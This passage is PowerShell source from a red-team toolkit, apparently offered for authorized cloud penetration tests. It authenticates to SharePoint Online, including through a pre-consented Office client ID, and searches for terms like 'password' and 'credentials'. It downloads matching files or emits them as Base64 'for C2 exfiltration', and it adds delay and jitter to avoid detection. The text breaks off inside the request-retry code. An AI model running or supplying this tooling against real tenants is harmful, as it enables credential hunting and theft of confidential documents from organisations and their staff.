<#
    This file is part of the toolkit EvilMist
    Copyright (C) 2025 Logisek
    https://github.com/Logisek/EvilMist

    EvilMist - a collection of scripts and utilities designed to support
    cloud penetration testing. The toolkit helps identify misconfigurations,
    assess privilege-escalation paths, and simulate attack techniques.
    EvilMist aims to streamline cloud-focused red-team workflows and improve
    the overall security posture of cloud infrastructures.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    For more see the file 'LICENSE' for copying permission.
#>

<#
.SYNOPSIS
    SharePoint Online search and file download via REST API.

.DESCRIPTION
    This script performs authenticated enumeration of SharePoint Online
    document repositories using the SharePoint REST Search API. It enables
    red-team operators to discover and download files from SharePoint
    during authorized penetration tests.

    Capabilities include:
    - Full-text keyword search across SharePoint document libraries
    - Faceted Query Language (FQL) support for advanced search
    - Refinement filters for precise result targeting
    - Paginated result retrieval with configurable row limits
    - File download to disk or Base64-encoded output (for C2 exfiltration)
    - Stealth features: request delay, jitter, retry with backoff

    This is a PowerShell port of ElephantPoint (Nettitude) adapted for
    the EvilMist toolkit. No external modules required - uses
    Invoke-RestMethod / Invoke-WebRequest with bearer token authentication.

.PARAMETER SPOUrl
    SharePoint Online domain (e.g., example.sharepoint.com). Optional — auto-detected
    from your Azure session when omitted. Required when using -Token directly.

.PARAMETER Token
    Bearer token for authentication (from ROADtools, TokenTactics, etc.). Requires -SPOUrl.

.PARAMETER UseAzCliToken
    Get token from Azure CLI (resource: https://{SPOUrl}).

.PARAMETER UseAzPowerShellToken
    Get token from Azure PowerShell (resource: https://{SPOUrl}).

.PARAMETER UseDeviceCode
    Force device code authentication (for terminals without browser popup).

.PARAMETER TenantId
    Azure AD tenant ID or domain (e.g., example.onmicrosoft.com). Optional —
    auto-detected from Azure session. Use to target a specific tenant.

.PARAMETER Query
    Search query string (keywords, filenames, content terms).

.PARAMETER MaxRows
    Maximum number of search results to return (1-500). Default: 50.

.PARAMETER EnableFQL
    Enable Faceted Query Language for advanced search syntax.

.PARAMETER RefinementFilter
    Refinement filter expression (e.g., 'filetype:equals("docx")').

.PARAMETER StartRow
    Starting row for pagination. Default: 0.

.PARAMETER FileUrl
    Server-relative file URL to download (e.g., /sites/hr/Shared Documents/report.docx).

.PARAMETER SavePath
    Local path to save downloaded file.

.PARAMETER Base64
    Return downloaded file as Base64-encoded string (for C2 exfiltration).

.PARAMETER ExportPath
    Export search results to CSV or JSON (based on file extension).

.PARAMETER Matrix
    Display search results in table/matrix format.

.PARAMETER EnableStealth
    Enable stealth mode with default delays (500ms + 300ms jitter).

.PARAMETER RequestDelay
    Base delay in seconds between API requests (0-60). Default: 0.

.PARAMETER RequestJitter
    Random jitter range in seconds to add/subtract from delay (0-30). Default: 0.

.PARAMETER MaxRetries
    Maximum retries on throttling (429) responses (1-10). Default: 3.

.PARAMETER QuietStealth
    Suppress stealth-related status messages.

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -Query "password"
    # Auto-connect and auto-detect (uses existing Azure session or prompts login)

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -UseDeviceCode -Query "password"
    # Interactive login with auto-detection of SharePoint domain

.EXAMPLE
    .\Invoke-EvilMist.ps1 -Script SharePointEnum -Query "password"
    # Zero-config via dispatcher

.EXAMPLE
    .\Invoke-EvilMist.ps1 -Script SharePointEnum -UseDeviceCode -Query "password"
    # Via dispatcher with device code auth

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -SPOUrl example.sharepoint.com -UseDeviceCode -Query "password"
    # Explicit SharePoint URL with interactive login (skips auto-detect)

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -SPOUrl example.sharepoint.com -Token $token -Query "password"
    # Search with direct bearer token (requires -SPOUrl)

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -SPOUrl example.sharepoint.com -Token $token -FileUrl "/sites/hr/Shared Documents/salaries.xlsx" -Base64
    # Download a file and output as Base64 (for C2 exfiltration)

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -Query "credentials" -EnableStealth -QuietStealth
    # Stealth search with auto-detection

.EXAMPLE
    .\Invoke-SharePointEnum.ps1 -Query "budget" -ExportPath "results.json" -Matrix
    # Search with matrix output and JSON export
#>

param(
    # === SHAREPOINT TARGET ===
    [Parameter(Mandatory = $false, Position = 0)]
    [string]$SPOUrl,

    # === AUTHENTICATION ===
    [Parameter(Mandatory = $false)]
    [string]$Token,

    [Parameter(Mandatory = $false)]
    [switch]$UseAzCliToken,

    [Parameter(Mandatory = $false)]
    [switch]$UseAzPowerShellToken,

    [Parameter(Mandatory = $false)]
    [switch]$UseDeviceCode,

    [Parameter(Mandatory = $false)]
    [string]$TenantId,

    # === SEARCH MODE ===
    [Parameter(Mandatory = $false)]
    [string]$Query,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 500)]
    [int]$MaxRows = 50,

    [Parameter(Mandatory = $false)]
    [switch]$EnableFQL,

    [Parameter(Mandatory = $false)]
    [string]$RefinementFilter,

    [Parameter(Mandatory = $false)]
    [int]$StartRow = 0,

    # === DOWNLOAD MODE ===
    [Parameter(Mandatory = $false)]
    [string]$FileUrl,

    [Parameter(Mandatory = $false)]
    [string]$SavePath,

    [Parameter(Mandatory = $false)]
    [switch]$Base64,

    # === OUTPUT ===
    [Parameter(Mandatory = $false)]
    [string]$ExportPath,

    [Parameter(Mandatory = $false)]
    [switch]$Matrix,

    # === STEALTH & EVASION ===
    [Parameter(Mandatory = $false)]
    [switch]$EnableStealth,

    [Parameter(Mandatory = $false)]
    [ValidateRange(0, 60)]
    [double]$RequestDelay = 0,

    [Parameter(Mandatory = $false)]
    [ValidateRange(0, 30)]
    [double]$RequestJitter = 0,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 3,

    [Parameter(Mandatory = $false)]
    [switch]$QuietStealth
)

# PowerShell 7+ required
if ($PSVersionTable.PSVersion.Major -lt 7) {
    Write-Host '[ERROR] This script requires PowerShell 7 or later.' -ForegroundColor Red
    Write-Host ('Current version: PowerShell ' + $PSVersionTable.PSVersion.ToString()) -ForegroundColor Yellow
    Write-Host 'Download PowerShell 7: https://aka.ms/powershell-release?tag=stable' -ForegroundColor Cyan
    exit 1
}

$ErrorActionPreference = "Continue"

# ============================================================================
# SCRIPT-SCOPED STATE VARIABLES
# ============================================================================

$script:AccessToken = $null
$script:SPOBaseUrl = $null

$script:StealthConfig = @{
    Enabled      = $EnableStealth.IsPresent
    BaseDelay    = $RequestDelay
    Jitter       = $RequestJitter
    MaxRetries   = $MaxRetries
    QuietMode    = $QuietStealth.IsPresent
    RequestCount = 0
    ThrottleCount = 0
    LastRequestTime = $null
}

# If stealth is enabled but no delay specified, use sensible defaults
if ($EnableStealth.IsPresent -and $RequestDelay -eq 0) {
    $script:StealthConfig.BaseDelay = 0.5
    $script:StealthConfig.Jitter = 0.3
}

$script:Results = @{
    SearchResults  = @()
    DownloadResult = $null
    SearchMetadata = $null
    Summary        = @{
        SPOUrl          = $null
        SearchQuery     = $null
        TotalResults    = 0
        ResultsReturned = 0
        StartRow        = 0
        FileDownloaded  = $null
        RequestCount    = 0
        ThrottleCount   = 0
    }
}

# ============================================================================
# BANNER
# ============================================================================

function Show-Banner {
    Write-Host ""

    $asciiArt = @"
███████╗██╗   ██╗██╗██╗     ███╗   ███╗██╗███████╗████████╗
██╔════╝██║   ██║██║██║     ████╗ ████║██║██╔════╝╚══██╔══╝
█████╗  ██║   ██║██║██║     ██╔████╔██║██║███████╗   ██║
██╔══╝  ╚██╗ ██╔╝██║██║     ██║╚██╔╝██║██║╚════██║   ██║
███████╗ ╚████╔╝ ██║███████╗██║ ╚═╝ ██║██║███████║   ██║
╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝╚══════╝   ╚═╝
"@

    Write-Host $asciiArt -ForegroundColor Magenta
    Write-Host "    SharePoint Online Enumeration - EvilMist Toolkit" -ForegroundColor Yellow
    Write-Host "    https://logisek.com | info@logisek.com"
    Write-Host "    GNU General Public License v3.0"
    Write-Host ""
    Write-Host ""
}

# ============================================================================
# STEALTH FUNCTIONS
# ============================================================================

function Get-StealthDelay {
    $baseDelay = $script:StealthConfig.BaseDelay
    $jitter = $script:StealthConfig.Jitter

    if ($baseDelay -eq 0 -and $jitter -eq 0) {
        return 0
    }

    $jitterValue = 0
    if ($jitter -gt 0) {
        $jitterValue = (Get-Random -Minimum (-$jitter * 1000) -Maximum ($jitter * 1000)) / 1000
    }

    $totalDelay = [Math]::Max(0, $baseDelay + $jitterValue)
    return $totalDelay
}

function Invoke-StealthDelay {
    param(
        [string]$Context = ""
    )

    if (-not $script:StealthConfig.Enabled -and $script:StealthConfig.BaseDelay -eq 0) {
        return
    }

    $delay = Get-StealthDelay

    if ($delay -gt 0) {
        if (-not $script:StealthConfig.QuietMode -and $Context) {
            Write-Host "    [Stealth] Waiting $([Math]::Round($delay, 2))s before $Context..." -ForegroundColor DarkGray
        }
        Start-Sleep -Milliseconds ([int]($delay * 1000))
    }

    $script:StealthConfig.LastRequestTime = Get-Date
}

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

function Format-FileSize {
    param(
        [Parameter(Mandatory = $true)]
        [long]$Bytes
    )

    if ($Bytes -ge 1GB) {
        return "{0:N2} GB" -f ($Bytes / 1GB)
    }
    elseif ($Bytes -ge 1MB) {
        return "{0:N2} MB" -f ($Bytes / 1MB)
    }
    elseif ($Bytes -ge 1KB) {
        return "{0:N2} KB" -f ($Bytes / 1KB)
    }
    else {
        return "$Bytes B"
    }
}

# ============================================================================
# AUTHENTICATION FUNCTIONS
# ============================================================================

function Get-AzCliSharePointToken {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Resource
    )
    try {
        Write-Host "[*] Attempting to use Azure CLI token..." -ForegroundColor Cyan
        $azToken = az account get-access-token --resource $Resource --query accessToken -o tsv 2>$null
        if ($azToken -and $azToken.Length -gt 0) {
            Write-Host "[+] Successfully retrieved Azure CLI token" -ForegroundColor Green
            return $azToken
        }
    }
    catch {
        Write-Host "[!] Failed to retrieve Azure CLI token" -ForegroundColor Yellow
    }
    return $null
}

function Get-AzPowerShellSharePointToken {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Resource
    )
    try {
        Write-Host "[*] Attempting to use Azure PowerShell token..." -ForegroundColor Cyan
        $azContext = Get-AzContext -ErrorAction SilentlyContinue
        if ($azContext) {
            $tokenResult = Get-AzAccessToken -ResourceUrl $Resource -ErrorAction SilentlyContinue
            if ($tokenResult) {
                if ($tokenResult.Token -is [securestring]) {
                    $token = [System.Net.NetworkCredential]::new('', $tokenResult.Token).Password
                }
                elseif ($tokenResult.Token) {
                    $token = $tokenResult.Token
                }
            }
            if ($token) {
                Write-Host "[+] Successfully retrieved Azure PowerShell token" -ForegroundColor Green
                return $token
            }
        }
    }
    catch {
        Write-Host "[!] Failed to retrieve Azure PowerShell token" -ForegroundColor Yellow
    }
    return $null
}

function Resolve-SharePointDomain {
    <#
    .SYNOPSIS
        Auto-detects the tenant's SharePoint Online domain from the current Azure session.
    .DESCRIPTION
        Uses Graph API to find the *.onmicrosoft.com verified domain, then derives
        the SharePoint URL. Falls back to UPN-based detection if Graph fails.
    .OUTPUTS
        Hashtable with SPOUrl and TenantId, or $null on failure.
    #>
    Write-Host "[*] Auto-detecting SharePoint domain from Azure session..." -ForegroundColor Cyan

    $context = Get-AzContext -ErrorAction SilentlyContinue
    if (-not $context) {
        Write-Host "[!] No Azure context available for auto-detection" -ForegroundColor Yellow
        return $null
    }

    # Strategy 1: Graph API — get verified domains from /organization
    try {
        Write-Host "[*] Querying Microsoft Graph for tenant domains..." -ForegroundColor Cyan
        $graphToken = Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com" -ErrorAction Stop
        if ($graphToken) {
            if ($graphToken.Token -is [securestring]) {
                $graphAccessToken = [System.Net.NetworkCredential]::new('', $graphToken.Token).Password
            }
            elseif ($graphToken.Token) {
                $graphAccessToken = $graphToken.Token
            }
        }

        if ($graphAccessToken) {
            $headers = @{ "Authorization" = "Bearer $graphAccessToken" }
            $orgResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/organization" -Headers $headers -ErrorAction Stop

            if ($orgResponse.value) {
                $org = $orgResponse.value[0]
                $tenantId = $org.id

                # Find the *.onmicrosoft.com domain (not *.mail.onmicrosoft.com)
                $onMicrosoftDomain = $org.verifiedDomains |
                    Where-Object { $_.name -match '\.onmicrosoft\.com$' -and $_.name -notmatch '\.mail\.onmicrosoft\.com$' } |
                    Select-Object -First 1

                if ($onMicrosoftDomain) {
                    $prefix = $onMicrosoftDomain.name -replace '\.onmicrosoft\.com$', ''
                    $spoUrl = "$prefix.sharepoint.com"
                    Write-Host "[+] Auto-detected SharePoint domain: $spoUrl (via Graph API)" -ForegroundColor Green
                    Write-Host "[+] Tenant ID: $tenantId" -ForegroundColor Green
                    return @{
                        SPOUrl   = $spoUrl
                        TenantId = $tenantId
                    }
                }
            }
        }
    }
    catch {
        Write-Host "[!] Graph API detection failed: $_" -ForegroundColor Yellow
    }

    # Strategy 2: UPN fallback — extract domain from account UPN
    try {
        $upn = $context.Account.Id
        if ($upn -and $upn -match '@') {
            $domain = ($upn -split '@')[1]
            Write-Host "[*] Attempting UPN-based detection from domain: $domain" -ForegroundColor Cyan

            if ($domain -match '(.+)\.onmicrosoft\.com$') {
                # Direct onmicrosoft.com domain — prefix is the SharePoint tenant
                $prefix = $Matches[1]
                $spoUrl = "$prefix.sharepoint.com"
                Write-Host "[+] Auto-detected SharePoint domain: $spoUrl (via UPN)" -ForegroundColor Green
                return @{
                    SPOUrl   = $spoUrl
                    TenantId = $context.Tenant.Id
                }
            }
            else {
                # Custom domain — take first label and probe
                $prefix = ($domain -split '\.')[0]
                $probeUrl = "https://$prefix.sharepoint.com"
                Write-Host "[*] Probing $probeUrl..." -ForegroundColor Cyan
                try {
                    $null = Invoke-WebRequest -Uri $probeUrl -Method Head -UseBasicParsing -ErrorAction Stop
                    $spoUrl = "$prefix.sharepoint.com"
                    Write-Host "[+] Auto-detected SharePoint domain: $spoUrl (via UPN probe)" -ForegroundColor Green
                    return @{
                        SPOUrl   = $spoUrl
                        TenantId = $context.Tenant.Id
                    }
                }
                catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 401 -or $statusCode -eq 403) {
                        # 401/403 means the SharePoint site exists
                        $spoUrl = "$prefix.sharepoint.com"
                        Write-Host "[+] Auto-detected SharePoint domain: $spoUrl (via UPN probe, $statusCode)" -ForegroundColor Green
                        return @{
                            SPOUrl   = $spoUrl
                            TenantId = $context.Tenant.Id
                        }
                    }
                    Write-Host "[!] SharePoint probe failed for $probeUrl (HTTP $statusCode)" -ForegroundColor Yellow
                }
            }
        }
    }
    catch {
        Write-Host "[!] UPN-based detection failed: $_" -ForegroundColor Yellow
    }

    Write-Host "[!] Could not auto-detect SharePoint domain" -ForegroundColor Yellow
    return $null
}

function Test-SharePointToken {
    <#
    .SYNOPSIS
        Validates a SharePoint access token with a lightweight API call.
    .OUTPUTS
        $true if the token is valid for SharePoint REST API, $false otherwise.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [string]$TokenValue,

        [Parameter(Mandatory = $true)]
        [string]$BaseUrl
    )

    try {
        $testHeaders = @{
            "Authorization" = "Bearer $TokenValue"
            "Accept"        = "application/json;odata=verbose"
        }
        $null = Invoke-RestMethod -Uri "$BaseUrl/_api/web" -Headers $testHeaders -ErrorAction Stop
        return $true
    }
    catch {
        $testStatus = $null
        if ($_.Exception.Response) {
            $testStatus = [int]$_.Exception.Response.StatusCode
        }
        # 403 = token audience is valid but user lacks site access — still usable for search
        if ($testStatus -eq 403) {
            return $true
        }
        return $false
    }
}

function Get-SharePointTokenViaDeviceCode {
    <#
    .SYNOPSIS
        Acquires a SharePoint access token using OAuth2 device code flow.
    .DESCRIPTION
        Uses the Microsoft Office first-party app (d3590ed6-52b3-4102-aeff-aad2292ab01c)
        which has pre-consented SharePoint delegated permissions in most M365 tenants.
        Falls back to Azure CLI client ID if needed.
    .OUTPUTS
        Access token string, or $null on failure.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [string]$Resource,

        [Parameter(Mandatory = $true)]
        [string]$TenantId
    )

    # Microsoft Office client ID — has pre-consented SharePoint permissions
    $clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    $scope = "$Resource/.default offline_access"

    # Step 1: Request device code
    try {
        $deviceCodeResponse = Invoke-RestMethod -Method Post `
            -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/devicecode" `
            -Body @{
                client_id = $clientId
                scope     = $scope
            } -ErrorAction Stop
    }
    catch {
        Write-Host "[ERROR] Failed to initiate device code flow: $_" -ForegroundColor Red
        return $null
    }

    Write-Host ""
    Write-Host "[AUTH] $($deviceCodeResponse.message)" -ForegroundColor Yellow
    Write-Host ""

    # Step 2: Poll for token completion
    $interval = if ($deviceCodeResponse.interval) { $deviceCodeResponse.interval } else { 5 }
    $deadline = (Get-Date).AddSeconds($deviceCodeResponse.expires_in)

    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds $interval

        try {
            $tokenResponse = Invoke-RestMethod -Method Post `
                -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
                -Body @{
                    grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
                    client_id   = $clientId
                    device_code = $deviceCodeResponse.device_code
                } -ErrorAction Stop

            if ($tokenResponse.access_token) {
                Write-Host "[+] Successfully authenticated for SharePoint via device code" -ForegroundColor Green
                return $tokenResponse.access_token
            }
        }
        catch {
            $errorBody = $null
            try {
                $errorBody = $_.ErrorDetails.Message | ConvertFrom-Json -ErrorAction SilentlyContinue
            }
            catch { }

            if ($errorBody) {
                switch ($errorBody.error) {
                    "authorization_pending" { continue }
                    "slow_down" {
                        $interval += 5
                        continue
                    }
                    "authorization_declined" {
                        Write-Host "[ERROR] Authentication was declined by user" -ForegroundColor Red
                        return $null
                    }
                    "expired_token" {
                        Write-Host "[ERROR] Device code expired — please try again" -ForegroundColor Red
                        return $null
                    }
                    default {
                        Write-Host "[ERROR] Authentication error: $($errorBody.error_description)" -ForegroundColor Red
                        return $null
                    }
                }
            }
            else {
                Write-Host "[ERROR] Token polling failed: $_" -ForegroundColor Red
                return $null
            }
        }
    }

    Write-Host "[ERROR] Device code authentication timed out" -ForegroundColor Red
    return $null
}

function Initialize-Authentication {
    Write-Host "`n[*] Initializing authentication..." -ForegroundColor Cyan

    # ======================================================================
    # Phase A — Ensure Azure session exists (when no direct -Token)
    # ======================================================================

    if ($Token) {
        # Direct token — skip session setup, validate SPOUrl requirement
        Write-Host "[+] Using provided bearer token" -ForegroundColor Green
        $script:AccessToken = $Token

        if (-not $SPOUrl) {
            Write-Host "[ERROR] -SPOUrl is required when using -Token directly" -ForegroundColor Red
            return $false
        }
    }
    elseif ($UseAzCliToken) {
        # Azure CLI path — SPOUrl is needed for resource scoping
        if (-not $SPOUrl) {
            Write-Host "[ERROR] -SPOUrl is required when using -UseAzCliToken" -ForegroundColor Red
            return $false
        }
    }
    elseif ($UseAzPowerShellToken) {
        # Azure PowerShell path — check for existing context
        $context = Get-AzContext -ErrorAction SilentlyContinue
        if (-not $context) {
            Write-Host "[ERROR] No Azure PowerShell session found. Run Connect-AzAccount first, or omit -UseAzPowerShellToken for auto-connect" -ForegroundColor Red
            return $false
        }
        Write-Host "[+] Using existing Azure PowerShell session" -ForegroundColor Green
        Write-Host "[+] Account: $($context.Account.Id)" -ForegroundColor Green
    }
    elseif ($UseDeviceCode) {
        # Device code — ensure session via device code auth
        $context = Get-AzContext -ErrorAction SilentlyContinue
        if ($context) {
            Write-Host "[+] Already connected to Azure" -ForegroundColor Green
            Write-Host "[+] Tenant: $($context.Tenant.Id)" -ForegroundColor Green
            Write-Host "[+] Account: $($context.Account.Id)" -ForegroundColor Green
        }
        else {
            try {
                Write-Host "[*] Using device code authentication..." -ForegroundColor Cyan
                $connectParams = @{ UseDeviceAuthentication = $true; ErrorAction = 'Stop' }
                if ($TenantId) {
                    $connectParams['TenantId'] = $TenantId
                }
                Connect-AzAccount @connectParams
                $context = Get-AzContext
                Write-Host "[+] Connected to Azure" -ForegroundColor Green
                Write-Host "[+] Tenant: $($context.Tenant.Id)" -ForegroundColor Green
                Write-Host "[+] Account: $($context.Account.Id)" -ForegroundColor Green
            }
            catch {
                Write-Host "[ERROR] Device code authentication failed: $_" -ForegroundColor Red
                return $false
            }
        }
    }
    else {
        # Auto-connect — check existing session, then browser popup, then device code fallback
        $context = Get-AzContext -ErrorAction SilentlyContinue
        if ($context) {
            Write-Host "[+] Already connected to Azure" -ForegroundColor Green
            Write-Host "[+] Tenant: $($context.Tenant.Id)" -ForegroundColor Green
            Write-Host "[+] Account: $($context.Account.Id)" -ForegroundColor Green
        }
        else {
            Write-Host "[*] No Azure session found, connecting..." -ForegroundColor Cyan
            try {
                $connectParams = @{ ErrorAction = 'Stop' }
                if ($TenantId) {
                    $connectParams['TenantId'] = $TenantId
                }
                Connect-AzAccount @connectParams
                $context = Get-AzContext
                Write-Host "[+] Connected to Azure" -ForegroundColor Green
                Write-Host "[+] Tenant: $($context.Tenant.Id)" -ForegroundColor Green
                Write-Host "[+] Account: $($context.Account.Id)" -ForegroundColor Green
            }
            catch {
                Write-Host "[!] Browser login failed, falling back to device code..." -ForegroundColor Yellow
                try {
                    $fallbackParams = @{ UseDeviceAuthentication = $true; ErrorAction = 'Stop' }
                    if ($TenantId) {
                        $fallbackParams['TenantId'] = $TenantId
                    }
                    Connect-AzAccount @fallbackParams
                    $context = Get-AzContext
                    Write-Host "[+] Connected to Azure" -ForegroundColor Green
                    Write-Host "[+] Tenant: $($context.Tenant.Id)" -ForegroundColor Green
                    Write-Host "[+] Account: $($context.Account.Id)" -ForegroundColor Green
                }
                catch {
                    Write-Host "[ERROR] Authentication failed: $_" -ForegroundColor Red
                    Write-Host "[*] TIP: Try running with -UseDeviceCode to avoid WAM popup issues" -ForegroundColor Yellow
                    return $false
                }
            }
        }
    }

    # ======================================================================
    # Phase B — Auto-detect SPOUrl if missing
    # ======================================================================

    if (-not $SPOUrl) {
        $detected = Resolve-SharePointDomain
        if ($detected) {
            $script:SPOUrl = $detected.SPOUrl
            Set-Variable -Name SPOUrl -Value $detected.SPOUrl -Scope 1
            $script:SPOBaseUrl = "https://$($detected.SPOUrl)"
            $script:Results.Summary.SPOUrl = $detected.SPOUrl
            if (-not $TenantId -and $detected.TenantId) {
                Set-Variable -Name TenantId -Value $detected.TenantId -Scope 1
            }
        }
        else {
            Write-Host "[ERROR] Could not auto-detect SharePoint domain. Specify -SPOUrl manually" -ForegroundColor Red
            return $false
        }
    }

    # ======================================================================
    # Phase C — Get SharePoint token
    # ======================================================================

    $resource = "https://$SPOUrl"

    # Direct token already set in Phase A
    if ($Token) {
        return $true
    }

    # Azure CLI token
    if ($UseAzCliToken) {
        $cliToken = Get-AzCliSharePointToken -Resource $resource
        if ($cliToken) {
            $script:AccessToken = $cliToken
            return $true
        }
        Write-Host "[ERROR] Failed to obtain Azure CLI token for $resource" -ForegroundColor Red
        return $false
    }

    # Azure PowerShell token
    if ($UseAzPowerShellToken) {
        $psToken = Get-AzPowerShellSharePointToken -Resource $resource
        if ($psToken) {
            $script:AccessToken = $psToken
            return $true
        }
        Write-Host "[ERROR] Failed to obtain Azure PowerShell token for $resource" -ForegroundColor Red
        return $false
    }

    # Session-based token (device code, auto-connect, or reused session)
    $sessionToken = $null
    try {
        $tokenResult = Get-AzAccessToken -ResourceUrl $resource -ErrorAction Stop
        if ($tokenResult) {
            if ($tokenResult.Token -is [securestring]) {
                $sessionToken = [System.Net.NetworkCredential]::new('', $tokenResult.Token).Password
            }
            elseif ($tokenResult.Token) {
                $sessionToken = $tokenResult.Token
            }
        }
    }
    catch {
        Write-Host "[!] Failed to get token from Azure session: $_" -ForegroundColor Yellow
    }

    # Validate session token against SharePoint REST API
    if ($sessionToken) {
        Write-Host "[*] Validating SharePoint token..." -ForegroundColor Cyan
        if (Test-SharePointToken -TokenValue $sessionToken -BaseUrl $resource) {
            Write-Host "[+] SharePoint token validated successfully" -ForegroundColor Green
            $script:AccessToken = $sessionToken
            return $true
        }
        Write-Host "[!] Azure session token not authorized for SharePoint REST API" -ForegroundColor Yellow
        Write-Host "[!] The Azure PowerShell app may lack SharePoint API permissions in this tenant" -ForegroundColor Yellow
    }

    # Fallback 1: Azure CLI token (if az CLI is available)
    try {
        $azPath = Get-Command az -ErrorAction SilentlyContinue
        if ($azPath) {
            Write-Host "[*] Trying Azure CLI token as fallback..." -ForegroundColor Cyan
            $cliToken = Get-AzCliSharePointToken -Resource $resource
            if ($cliToken) {
                Write-Host "[*] Validating Azure CLI token..." -ForegroundColor Cyan
                if (Test-SharePointToken -TokenValue $cliToken -BaseUrl $resource) {
                    Write-Host "[+] Azure CLI token validated for SharePoint" -ForegroundColor Green
                    $script:AccessToken = $cliToken
                    return $true
                }
                Write-Host "[!] Azure CLI token also not authorized for SharePoint" -ForegroundColor Yellow
            }
        }
    }
    catch { }

    # Fallback 2: MSAL device code flow with Microsoft Office client ID
    # The Office app (d3590ed6-...) has pre-consented SharePoint permissions in most M365 tenants
    Write-Host "[*] Falling back to device code authentication for SharePoint..." -ForegroundColor Cyan
    $context = Get-AzContext -ErrorAction SilentlyContinue
    $tenantIdForAuth = if ($TenantId) { $TenantId } elseif ($context) { $context.Tenant.Id } else { "common" }
    $msalToken = Get-SharePointTokenViaDeviceCode -Resource $resource -TenantId $tenantIdForAuth
    if ($msalToken) {
        $script:AccessToken = $msalToken
        return $true
    }

    Write-Host "[ERROR] No authentication method available. Use -Token, -UseAzCliToken, -UseAzPowerShellToken, -UseDeviceCode, or ensure an Azure session is active" -ForegroundColor Red
    return $false
}

# ============================================================================
# HTTP REQUEST WRAPPER
# ============================================================================

function Invoke-SPRequest {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uri,

        [Parameter(Mandatory = $false)]
        [string]$Method = "GET",

        [Parameter(Mandatory = $false)]
        [object]$Body = $null,

        [Parameter(Mandatory = $false)]
        [string]$ContentType = "application/json;odata=verbose",

        [Parameter(Mandatory = $false)]
        [string]$Accept = "application/json;odata=verbose",

        [Parameter(Mandatory = $false)]
        [switch]$RawResponse,

        [Parameter(Mandatory = $false)]
        [string]$OutFile,

        [Parameter(Mandatory = $false)]
        [string]$Context = "request"
    )

    Invoke-StealthDelay -Context $Context
    $script:StealthConfig.RequestCount++

    $retryCount = 0

    while ($retryCount -le $script:StealthConfig.MaxRetries) {
        try {
            $headers = @{
                "Authorization" = "Bearer $($script:AccessToken)"
                "Accept"        = $Accept
            }

            $params = @{
                Uri         = $Uri
                Method      = $Method
                Headers     = $headers
                ContentType = $ContentType
                ErrorAction = "Stop"
            }

            if ($Body) {
                if ($Body -is [hashtable] -or $Body -is [PSCustomObject]) {
                    $params.Body = ($Body | ConvertTo-Json -Depth 10 -Compress)
                }
                else {
                    $params.Body = $Body
                }
            }

            # File download to disk - use Invoke-WebRequest with -OutFile
            if ($OutFile) {
                $params.Remove('ContentType') | Out-Null
                $response = Invoke-WebRequest @params -OutFile $OutFile -UseBasicParsing
                return @{
                    Success    = $true
                    StatusCode = 200
                    FilePath   = $OutFile
                }
            }

            # Raw binary response (for Base64 encoding)
            if ($RawResponse) {
                $params.Remove('ContentType') | Out-Null
                $response = Invoke-WebRequest @params -UseBasicParsing
                return @{
                    Success    = $true
                    StatusCode = $response.StatusCode
                    Content    = $response.Content
                    Headers    = $response.Headers
                }
            }

            # Standard JSON response
            $response = Invoke-RestMethod @params
            return @{
                Success    = $true
                StatusCode = 200
                Content    = $response
            }
        }
        catch {
            $statusCode = $null
            if ($_.Exception.Response) {
                $statusCode = [int]$_.Exception.Response.StatusCode
            }
            elseif ($_.Exception.Message -match '(\d{3})') {
                $statusCode = [int]$Matches[1]
            }

            # Handle 429 Too Many Requests (throttling)
            if ($statusCode -eq 429) {
                $script:StealthConfig.ThrottleCount++

                if ($retryCount -ge $script:StealthConfig.MaxRetries) {
                    if (-not $script:StealthConfig.QuietMode) {
                        Write-Host "    [!] Max retries ($($script:StealthConfig.MaxRetries)) exceeded for throttling" -ForegroundColor Red
                    }
                    return @{
                        Success    = $false
                        StatusCode = 429
                        Error      = "Throttled - max retries exceeded"
                    }
                }

                $retryAfter = 30
                if ($_.Exception.Response.Headers) {
                    try {
                        $retryAfterHeader = $_.Exception.Response.Headers | Where-Object { $_.Key -eq 'Retry-After' }
                        if ($retryAfterHeader) {
                            $parsed = 0
                            if ([int]::TryParse($retryAfterHeader.Value, [ref]$parsed)) {
                                $retryAfter = $parsed
                            }
                        }
                    }
                    catch { }
                }

                $jitterMs = Get-Random -Minimum 0 -Maximum 5000
                $totalWait = $retryAfter + ($jitterMs / 1000)

                if (-not $script:StealthConfig.QuietMode) {
                    Write-Host "    [Throttle] Rate limited. Waiting $([int][Math]::Ceiling($totalWait)) seconds..." -ForegroundColor Yellow
                }
                Start-Sleep -Seconds ([int][Math]::Ceiling($totalWait))

                $retryCount++
                continue
            }

            # Handle 503 Service Unavailable
            if ($statusCode -eq 503) {
                if ($retryCount -lt $script:StealthConfig.MaxRetries) {
                    $backoffSeconds = [Math]::Pow(2, $retryCount) * 5
